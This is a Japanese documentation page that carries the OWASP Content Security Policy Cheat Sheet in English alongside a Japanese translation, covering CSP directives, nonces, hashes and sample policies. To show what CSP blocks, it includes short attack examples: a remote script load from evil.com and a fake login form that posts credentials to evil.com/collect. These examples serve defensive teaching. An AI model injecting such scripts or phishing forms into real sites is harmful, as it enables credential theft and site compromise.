---
title: Content Security Policy Cheat Sheet
hide_title: true
---

<div className="docHero" data-category="asvs-v3">
  <h1>Content Security Policy チートシート</h1>
  <div className="docMeta">
    <span className="docPill">最終更新: 2026-05-20</span>
    <span className="docPill">読了時間: 準備中</span>
    <span className="docPill">カテゴリ: Web フロントエンドセキュリティ</span>
  </div>
</div>

<p className="docLead">Content Security Policy チートシートを、原文・翻訳・対比表示で確認できます。ASVS Index 対応の文脈で、公式原文と日本語訳を確認しやすく整理しています。</p>

<div className="tabbedContent">
  <input className="tabInput" type="radio" name="content-security-policy-view" id="content-security-policy-original" />
  <input className="tabInput" type="radio" name="content-security-policy-view" id="content-security-policy-translation" defaultChecked />
  <input className="tabInput" type="radio" name="content-security-policy-view" id="content-security-policy-bilingual" />

  <div className="contentTabs">
    <label htmlFor="content-security-policy-original" title="OWASP 原文">原文</label>
    <label htmlFor="content-security-policy-translation" title="日本語訳">翻訳</label>
    <label htmlFor="content-security-policy-bilingual" title="原文と翻訳を並べて確認">対比表示</label>
  </div>

<section id="content-security-policy-original-panel" className="tabPanel originalPanel contentPanel">

## Introduction

This article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.

## Context

The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.

### Defense against XSS

CSP defends against XSS attacks in the following ways:

#### 1. Restricting Inline Scripts

By preventing the page from executing inline scripts, attacks like injecting

```html
<script>document.body.innerHTML='defaced'</script>
```

 will not work.

#### 2. Restricting Remote Scripts

By preventing the page from loading scripts from arbitrary servers, attacks like injecting

```html
<script src="https://evil.com/hacked.js"></script>
```

will not work.

#### 3. Restricting Unsafe JavaScript

By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. Restricting Form submissions

By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5. Restricting Objects

And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.

### Defense against framing attacks

Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.

Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.

### Defense in Depth

A strong CSP provides an effective __second layer__ of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.

Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.

With all that being said, CSP __should not__ be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), and then deploy CSP on top of that as a bonus security layer.

## Policy Delivery

You can deliver a Content Security Policy to your website in three ways.

### 1. Content-Security-Policy Header

Send a Content-Security-Policy HTTP response header from your web server.

```text
Content-Security-Policy: ...
```

Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.

This is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+

### 2. Content-Security-Policy-Report-Only Header

Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.

```text
Content-Security-Policy-Report-Only: ...
```

Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.

This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")

Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).

### 3. Content-Security-Policy Meta Tag

Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.

In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).

### WARNING

__DO NOT__ use `X-Content-Security-Policy` or `X-WebKit-CSP`. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.

## CSP Types (granular/allowlist based or strict)

The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.

However, current leading practice is to create a "Strict" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.

## Strict CSP

A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) along with one of two mechanisms:

- Nonce based
- Hash based

The `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.

The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:

__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__

### Nonce based

Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

#### Warning

__Don't__ create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.

### Hashes

When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

To get the hash, look at Google Chrome developer tools for violations like this:

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...

You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.

#### Note

Using hashes can be a risky approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.

### strict-dynamic

The `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.

If a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.

Note that whilst `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.

For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

## Detailed CSP Directives

Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.

### Fetch Directives

Fetch directives tell the browser the locations to trust and load resources from.

Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
- `font-src` specifies which URLs to load fonts from.
- `img-src` specifies the URLs that images can be loaded from.
- `manifest-src` specifies the URLs that application manifests may be loaded from.
- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
- `prefetch-src` specifies the URLs from which resources can be prefetched from.
- `object-src` specifies the URLs from which plugins can be loaded from.
- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
    - `script-src-attr` controls the execution of event handlers.
- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
    - `style-src-elem` controls styles except for inline attributes.
    - `style-src-attr` controls styles attributes.
- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.

### Document Directives

Document directives instruct the browser about the properties of the document to which the policies will apply to.

- `base-uri` specifies the possible URLs that the `<base>` element can use.
- `plugin-types` limits the types of resources that can be loaded into the document (*e.g.* `application/pdf`). 3 rules apply to the affected elements, `<embed>` and `<object>`:
    - The element needs to explicitly declare its type.
    - The element's type needs to match the declared type.
    - The element's resource needs to match the declared type.
- `sandbox` restricts a page's actions such as submitting forms.
    - Only applies when used with the request header `Content-Security-Policy`.
    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Navigation Directives

Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.

- `form-action` restricts the URLs which the forms can submit to.
- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
    - If this directive is specified in a `<meta>` tag, the directive is ignored.
    - This directive doesn't fallback to the `default-src` directive.
    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.

### Reporting Directives

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

- `report-to` (CSP Level 3, used together with the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API)) is the __primary, current__ reporting directive. It references a group name defined in the `Reporting-Endpoints` (or legacy `Report-To`) response header containing a JSON-formatted endpoint list.
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` is __deprecated__ by CSP Level 3 in favor of `report-to`. It takes a URI that reports are sent to.
    - Format: `Content-Security-Policy: report-uri https://example.com/csp-reports`

For backward compatibility, declare both directives in conjunction. Browsers that support `report-to` will use it and ignore `report-uri`; older browsers fall back to `report-uri`. Once support for legacy browsers is no longer required, `report-uri` can be removed.

### Special Directive Sources

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

## CSP Sample Policies

### Strict Policy

A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.

As noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.

Based on those instructions, one of the following two policies can be used to apply a strict policy:

#### Nonce-based Strict Policy

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### Hash-based Strict Policy

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

### Basic non-Strict CSP Policy

This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.

If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.

The most basic policy assumes:

- All resources are hosted by the same domain of the document.
- There are no inlines or evals for scripts and style resources.
- There is no need for other websites to frame the website.
- There are no form-submissions to external websites.

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

To tighten further, one can apply the following:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).

### Upgrading insecure requests

If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### Preventing framing attacks (clickjacking, cross-site leaks)

- To prevent all framing of your content use:
    - `Content-Security-Policy: frame-ancestors 'none';`
- To allow for the site itself, use:
    - `Content-Security-Policy: frame-ancestors 'self';`
- To allow for trusted domain, do the following:
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### Refactoring inline code

When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:

```javascript
<script>
var foo = "314"
<script>
```

The inline code can be moved to a separate JavaScript file and the code in the page becomes:

```javascript
<script src="app.js">
</script>
```

With `app.js` containing the `var foo = "314"` code.

The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:

```html
<button id="button1" onclick="doSomething()">
```

This should be replaced by `addEventListener` calls:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

</section>

<section id="content-security-policy-translation-panel" className="tabPanel translationPanel contentPanel">

## はじめに

この記事では、Web アプリケーションのクライアント側に**多層防御 (defense in depth)** の考え方を組み込む方法を示します。サーバーから Content-Security-Policy (CSP) ヘッダーを注入することで、ブラウザは現在閲覧中のページへコンテンツを読み込む動的呼び出しからユーザーを保護できるようになります。

## コンテキスト

XSS (Cross-Site Scripting)、クリックジャッキング、クロスサイトリークの脆弱性が増えているため、より**多層防御**のセキュリティアプローチが求められます。

### XSS に対する防御

CSP は次の方法で XSS 攻撃を防御します。

#### 1. インラインスクリプトの制限

ページによるインラインスクリプトの実行を防ぐことで、次のような注入攻撃は機能しません。

```html
<script>document.body.innerHTML='defaced'</script>
```

#### 2. リモートスクリプトの制限

ページが任意のサーバーからスクリプトを読み込むことを防ぐことで、次のような注入攻撃は機能しません。

```html
<script src="https://evil.com/hacked.js"></script>
```

#### 3. 危険な JavaScript の制限

`eval` のようなテキストから JavaScript へ変換する関数の実行をページで防ぐことにより、Web サイトは次のような脆弱性から保護されます。

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. フォーム送信の制限

Web サイト上の HTML フォームがデータを送信できる先を制限することで、フィッシングフォームの注入も機能しなくなります。

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

#### 5. オブジェクトの制限

さらに、HTML の [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) タグを制限することで、攻撃者が悪意のある Flash、Java、その他のレガシー実行可能要素をページへ注入することもできなくなります。

### フレーミング攻撃に対する防御

クリックジャッキングや、ブラウザのサイドチャネル攻撃 (xs-leaks) の一部の亜種では、悪意のある Web サイトがターゲット Web サイトをフレーム内に読み込む必要があります。

歴史的にはこの目的で `X-Frame-Options` ヘッダーが使われてきましたが、これは CSP の `frame-ancestors` ディレクティブによって旧式化されています。

### 多層防御

強力な CSP は、さまざまな種類の脆弱性、特に XSS に対する有効な**第二の防御層**を提供します。CSP は Web アプリケーションが脆弱性を*含む*こと自体を防ぎませんが、攻撃者がそれらの脆弱性を悪用することを大幅に難しくできます。

ユーザー入力を一切受け付けない完全に静的な Web サイトであっても、CSP を使用して [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) の使用を強制できます。これは、JavaScript ファイルをホストしているサードパーティサイトの一つ (分析スクリプトなど) が侵害された場合に、悪意のあるコードが Web サイトに読み込まれることを防ぐ助けになります。

とはいえ、XSS に対する唯一の防御機構として CSP に依存**すべきではありません**。それでも [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) に記載されているような適切な開発プラクティスに従い、その上に追加のセキュリティ層として CSP をデプロイする必要があります。

## ポリシーの配信

Content Security Policy は、Web サイトへ三つの方法で配信できます。

### 1. Content-Security-Policy ヘッダー

Web サーバーから Content-Security-Policy HTTP レスポンスヘッダーを送信します。

```text
Content-Security-Policy: ...
```

ヘッダーを使用する方法が推奨であり、CSP の全機能セットをサポートします。インデックスページだけではなく、すべての HTTP レスポンスで送信してください。

これは W3C 仕様の標準ヘッダーです。Firefox 23+、Chrome 25+、Opera 19+ でサポートされています。

### 2. Content-Security-Policy-Report-Only ヘッダー

`Content-Security-Policy-Report-Only` を使用すると、強制されない CSP を配信できます。

```text
Content-Security-Policy-Report-Only: ...
```

それでも、違反レポートはコンソールに出力され、`report-to` および `report-uri` ディレクティブが使用されている場合は違反エンドポイントへ送信されます。

これも W3C 仕様の標準ヘッダーです。Firefox 23+、Chrome 25+、Opera 19+ でサポートされています。この場合、ポリシーは非ブロッキング ("fail open") であり、`report-uri` (またはより新しい `report-to`) ディレクティブで指定された URL にレポートが送信されます。これは CSP をブロッキングモード ("fail closed") で利用する前段階としてよく使われます。

ブラウザは、サイトが `Content-Security-Policy` と `Content-Security-Policy-Report-Only` の両方を同時に問題なく使用することを完全にサポートしています。このパターンは、たとえば厳格な `Report-Only` ポリシーを実行して多数の違反レポートを取得しつつ、正当なサイト機能を壊さないように、より緩い強制ポリシーを適用するために使えます。

### 3. Content-Security-Policy Meta タグ

たとえば、ヘッダーを制御できない CDN に HTML ファイルをデプロイしている場合など、Content-Security-Policy ヘッダーを使用できないことがあります。

この場合でも、次のように HTML マークアップ内で `http-equiv` meta タグを指定することで CSP を使用できます。

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

完全な XSS 防御を含め、ほぼすべてが引き続きサポートされます。ただし、[フレーミング保護](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)、[サンドボックス化](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)、または [CSP 違反ログ記録エンドポイント](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to) は使用できません。

### 警告

`X-Content-Security-Policy` や `X-WebKit-CSP` は**使用しないでください**。これらの実装は旧式であり (Firefox 23、Chrome 25 以降)、限定的で、一貫性がなく、非常にバグが多いものです。

## CSP の種類 (細粒度/許可リストベースまたは strict)

CSP を構築する元々の仕組みでは、HTML ページのコンテキストで許可されるコンテンツとソースを定義する許可リストを作成していました。

しかし、現在の主要なプラクティスは、よりデプロイしやすく、バイパスされにくいためより安全な "Strict" CSP を作成することです。

## Strict CSP

Strict CSP は、後述の細粒度な [Fetch ディレクティブ](#fetch-ディレクティブ)のうち限定された数のディレクティブを、次の二つの仕組みのいずれかと組み合わせることで作成できます。

- Nonce ベース
- Hash ベース

`strict-dynamic` ディレクティブは、Strict CSP を実装しやすくするために任意で使用することもできます。

以降のセクションではこれらの仕組みに関する基本的なガイダンスを示しますが、Strict CSP を作成するには、Google による詳細で体系的な手順に従うことを強く推奨します。

__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__

### Nonce ベース

Nonce は、HTTP レスポンスごとに生成し、Content-Security-Policy ヘッダーへ追加する、一回限り使用の一意なランダム値です。例を示します。

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

次に、この nonce をビューへ渡し (nonce を使用するには非静的 HTML が必要です)、次のような script タグをレンダリングします。

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

#### 警告

すべての script タグを "script nonce=..." に置換するミドルウェアを作成**しないでください**。攻撃者が注入したスクリプトにも nonce が付与されてしまうためです。nonce を使用するには、実際の HTML テンプレートエンジンが必要です。

### Hash

インラインスクリプトが必要な場合、特定のスクリプトだけの実行を許可する別の選択肢として `script-src 'hash_algo-hash'` があります。

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

ハッシュを取得するには、Google Chrome 開発者ツールで次のような違反を確認します。

> ❌ 次の Content Security Policy ディレクティブに違反しているため、インラインスクリプトの実行が拒否されました: "..." 'unsafe-inline' キーワード、ハッシュ (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__)、または nonce...

この [hash generator](https://report-uri.com/home/hash) も使用できます。これは hash を使用する優れた[例](https://csp.withgoogle.com/docs/faq.html#static-content)です。

#### 注記

Hash の使用はリスクのあるアプローチになり得ます。たとえばコード整形などにより script タグ内の*何か*が変更されると (空白であっても)、ハッシュが変わり、スクリプトはレンダリングされません。

### strict-dynamic

`strict-dynamic` ディレクティブは、hash または nonce のいずれかと組み合わせて Strict CSP の一部として使用できます。

正しい hash または nonce を持つスクリプトブロックが追加の DOM 要素を作成し、その内部で JS を実行する場合、`strict-dynamic` は、それぞれに nonce や hash を明示的に追加しなくても、それらの要素を信頼するようブラウザに伝えます。

`strict-dynamic` は CSP Level 3 の機能ですが、CSP Level 3 は一般的なモダンブラウザで非常に広くサポートされています。

詳細については、[strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage) を確認してください。

## 詳細な CSP ディレクティブ

開発者がポリシーの流れを細かく制御できるように、複数の種類のディレクティブが存在します。細かすぎる、または許可が広すぎる非 Strict ポリシーを作成すると、バイパスと保護の喪失につながる可能性が高い点に注意してください。

### Fetch ディレクティブ

Fetch ディレクティブは、信頼してリソースを読み込む場所をブラウザに伝えます。

ほとんどの fetch ディレクティブには、[W3C で指定されたフォールバックリスト](https://www.w3.org/TR/CSP3/#directive-fallback-list)があります。このリストにより、スクリプト、画像、ファイルなどのソースを細かく制御できます。

- `child-src` は、開発者がネストされたブラウジングコンテキストと worker 実行コンテキストを制御できるようにします。
- `connect-src` は、fetch リクエスト、XHR、EventSource、Beacon、WebSocket 接続を制御します。
- `font-src` は、フォントを読み込める URL を指定します。
- `img-src` は、画像を読み込める URL を指定します。
- `manifest-src` は、アプリケーションマニフェストを読み込める URL を指定します。
- `media-src` は、動画、音声、テキストトラックリソースを読み込める URL を指定します。
- `prefetch-src` は、リソースをプリフェッチできる URL を指定します。
- `object-src` は、プラグインを読み込める URL を指定します。
- `script-src` は、スクリプトを実行できる場所を指定します。これは他のスクリプト系ディレクティブのフォールバックディレクティブです。
    - `script-src-elem` は、スクリプトリクエストおよびスクリプトブロックの実行が発生できる場所を制御します。
    - `script-src-attr` は、イベントハンドラーの実行を制御します。
- `style-src` は、ドキュメントへスタイルを適用できる場所を制御します。これには `<link>` 要素、`@import` ルール、`Link` HTTP レスポンスヘッダーフィールドから発生するリクエストが含まれます。
    - `style-src-elem` は、インライン属性を除くスタイルを制御します。
    - `style-src-attr` は、style 属性を制御します。
- `default-src` は、他の fetch ディレクティブのフォールバックディレクティブです。指定されたディレクティブには継承はありませんが、指定されていないディレクティブは `default-src` の値へフォールバックします。

### Document ディレクティブ

Document ディレクティブは、ポリシーが適用されるドキュメントのプロパティについてブラウザに指示します。

- `base-uri` は、`<base>` 要素が使用できる URL を指定します。
- `plugin-types` は、ドキュメントへ読み込めるリソースの種類を制限します (*例:* `application/pdf`)。影響を受ける要素 `<embed>` と `<object>` には三つのルールが適用されます。
    - 要素はその type を明示的に宣言する必要があります。
    - 要素の type は宣言された type と一致する必要があります。
    - 要素のリソースは宣言された type と一致する必要があります。
- `sandbox` は、フォーム送信などページのアクションを制限します。
    - リクエストヘッダー `Content-Security-Policy` とともに使用された場合にのみ適用されます。
    - ディレクティブに値を指定しない場合、すべての sandbox 制限が有効になります。`Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### Navigation ディレクティブ

Navigation ディレクティブは、ドキュメントがナビゲートできる場所、またはドキュメントを埋め込める場所についてブラウザに指示します。

- `form-action` は、フォームが送信できる URL を制限します。
- `frame-ancestors` は、要求されたリソースを `<frame>`、`<iframe>`、`<object>`、`<embed>`、または `<applet>` 要素内に埋め込める URL を制限します。
    - このディレクティブが `<meta>` タグで指定された場合、そのディレクティブは無視されます。
    - このディレクティブは `default-src` ディレクティブへフォールバックしません。
    - `X-Frame-Options` はこのディレクティブによって旧式化され、ユーザーエージェントから無視されます。

### Reporting ディレクティブ

Reporting ディレクティブは、防止された動作の違反を指定された場所へ配信します。これらのディレクティブは単独では意味を持たず、他のディレクティブに依存します。

- `report-to` (CSP Level 3。[Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API) とともに使用) は、**主要かつ現在の**レポート用ディレクティブです。JSON 形式のエンドポイントリストを含む `Reporting-Endpoints` (またはレガシーな `Report-To`) レスポンスヘッダーで定義されたグループ名を参照します。
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` は、CSP Level 3 により `report-to` を優先して**非推奨**になっています。これはレポート送信先の URI を受け取ります。
    - 形式: `Content-Security-Policy: report-uri https://example.com/csp-reports`

後方互換性を確保するには、両方のディレクティブを併用してください。`report-to` をサポートするブラウザはそれを使用して `report-uri` を無視し、古いブラウザは `report-uri` へフォールバックします。レガシーブラウザのサポートが不要になったら、`report-uri` を削除できます。

### 特別なディレクティブソース

| 値 | 説明 |
| --- | --- |
| 'none' | どの URL にも一致しません。 |
| 'self' | 同じスキームとポート番号を持つオリジンサイトを指します。 |
| 'unsafe-inline' | インラインスクリプトまたはインラインスタイルの使用を許可します。 |
| 'unsafe-eval' | スクリプト内で eval の使用を許可します。 |

ディレクティブソースの動作をよりよく理解するには、[W3C のソースリスト](https://w3c.github.io/webappsec-csp/#framework-directive-source-list)を確認してください。

## CSP サンプルポリシー

### Strict ポリシー

Strict ポリシーの役割は、古典的な格納型 XSS、反射型 XSS、および一部の DOM XSS 攻撃から保護することであり、CSP を実装しようとするすべてのチームにとって最適な目標であるべきです。

前述のとおり、Google は Strict CSP を作成するための詳細で体系的な[手順](https://web.dev/strict-csp)を用意しています。

その手順に基づき、Strict ポリシーを適用するには次の二つのポリシーのいずれかを使用できます。

#### Nonce ベースの Strict ポリシー

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### Hash ベースの Strict ポリシー

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

### 基本的な非 Strict CSP ポリシー

このポリシーは、Strict ポリシーを作成できない場合に使用でき、クロスサイトフレーミングとクロスサイトフォーム送信を防止します。これは、すべてのデフォルトレベルのディレクティブについて、元のドメインからのリソースのみを許可し、インラインスクリプト/スタイルの実行を許可しません。

アプリケーションがこれらの制限下で機能する場合、攻撃対象領域は大幅に削減され、ほとんどのモダンブラウザで動作します。

最も基本的なポリシーは、次を前提としています。

- すべてのリソースがドキュメントと同じドメインでホストされている。
- スクリプトとスタイルリソースにインラインまたは eval がない。
- 他の Web サイトがその Web サイトをフレーム化する必要がない。
- 外部 Web サイトへのフォーム送信がない。

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

さらに強化するには、次を適用できます。

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

このポリシーは、同一オリジンからの画像、スクリプト、AJAX、CSS を許可し、その他のリソース (例: object、frame、media など) の読み込みを許可しません。

### 安全でないリクエストのアップグレード

開発者が HTTP から HTTPS へ移行している場合、次のディレクティブにより、すべてのリクエストが HTTP へのフォールバックなしで HTTPS 経由で送信されるようになります。

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### フレーミング攻撃の防止 (クリックジャッキング、クロスサイトリーク)

- コンテンツのすべてのフレーミングを防止するには、次を使用します。
    - `Content-Security-Policy: frame-ancestors 'none';`
- サイト自身を許可するには、次を使用します。
    - `Content-Security-Policy: frame-ancestors 'self';`
- 信頼済みドメインを許可するには、次を実行します。
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### インラインコードのリファクタリング

`default-src` または `script-src*` ディレクティブが有効な場合、CSP はデフォルトで、HTML ソース内に配置された次のような JavaScript コードを無効にします。

```javascript
<script>
var foo = "314"
<script>
```

インラインコードは別の JavaScript ファイルに移動でき、ページ内のコードは次のようになります。

```javascript
<script src="app.js">
</script>
```

`app.js` には `var foo = "314"` コードを含めます。

インラインコードの制限は `inline event handlers` にも適用されるため、次の構造は CSP の下でブロックされます。

```html
<button id="button1" onclick="doSomething()">
```

これは `addEventListener` 呼び出しに置き換えるべきです。

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

</section>

<section id="content-security-policy-bilingual-panel" className="tabPanel bilingualPanel">

<div className="bilingualPair">
<div className="bilingualBlock english">
